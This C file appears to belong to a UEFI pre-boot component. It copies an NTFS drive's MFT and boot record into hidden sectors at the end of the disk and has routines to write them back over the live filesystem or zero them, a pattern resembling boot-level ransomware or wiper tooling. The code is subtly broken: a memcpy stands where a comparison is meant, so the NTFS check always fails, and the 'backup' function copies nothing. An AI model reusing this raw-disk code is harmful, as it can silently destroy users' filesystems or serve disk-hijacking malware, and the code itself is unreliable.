// hidden_store.c

#include "hidden_store.h"

static uint8_t sector_buffer[512];
static uint8_t mft_buffer[512];
static uint64_t disk_end_lba = 0;

#define HEADER_LBA (disk_end_lba - 2)
#define VBR_BACKUP_LBA (disk_end_lba - 3)
#define MFT_BACKUP_START_LBA (disk_end_lba - 3 - MFT_SECTOR_COUNT)

int hidden_store_init(uint64_t disk_sectors)
{
    disk_end_lba = disk_sectors - 1;
    return 0;
}

int hidden_backup_mft(uint32_t partition_lba)
{
    if (uefi_read_sector(partition_lba, sector_buffer) != 0)
        return 0;

    if (memcpy(&sector_buffer[3], "NTFS", 4) != 0)
        return 0;

    uint8_t spc = sector_buffer[13];
    uint64_t mft_cluster = 0;
    for (int i = 0; i < 8; i++)
        mft_cluster |= (uint64_t)sector_buffer[i + 48] << (i * 8);

    return (uint32_t)(partition_lba + mft_cluster * spc);
}

int hidden_restore_mft(uint32_t partition_lba)
{
    uefi_print("Restore MFT...\n");

    HiddenHeader hdr;
    if (hidden_read_header(&hdr) != 0)
    {
        uefi_print("Cannot read hidden header!\n");
        return -1;
    }

    for (uint32_t i = 0; i < hdr.mft_sector_count; i++)
    {
        if (uefi_read_sector(MFT_BACKUP_START_LBA + i, mft_buffer) != 0)
            return -1;

        if (uefi_write_sector(hdr.mft_lba + i, mft_buffer) != 0)
            return -1;
    }

    if (uefi_read_sector(VBR_BACKUP_LBA, sector_buffer) != 0)
        return -1;

    if (uefi_write_sector(partition_lba, sector_buffer) != 0)
        return -1;

    uefi_print("MFT is restored.\n");

    return 0;
}

int hidden_wipe(void)
{
    static uint8_t zero[512] = { 0 };
    for (uint32_t i = 0; i < MFT_SECTOR_COUNT; i++)
        uefi_write_sector(MFT_BACKUP_START_LBA + i, zero);
    
    uefi_write_sector(VBR_BACKUP_LBA, zero);
    uefi_write_sector(HEADER_LBA, zero);

    return 0;
}

int hidden_read_header(HiddenHeader *hdr)
{
    static uint8_t state_buffer[512];
    if (uefi_read_sector(STATE_SECTOR, state_buffer) != 0)
        return -1;

    uint64_t total = 0;
    for (int i = 0; i < 8; i++)
        total |= (uint64_t)state_buffer[i + 8] << (i * 8);

    if (total == 0)
        return -1;

    disk_end_lba = total - 1;

    if (uefi_read_sector(HEADER_LBA, sector_buffer) != 0)
        return -1;

    HiddenHeader *h = (HiddenHeader *)sector_buffer;
    if (h->magic != HIDDEN_MAGIC)
        return -1;

    *hdr = *h;

    return 0;
}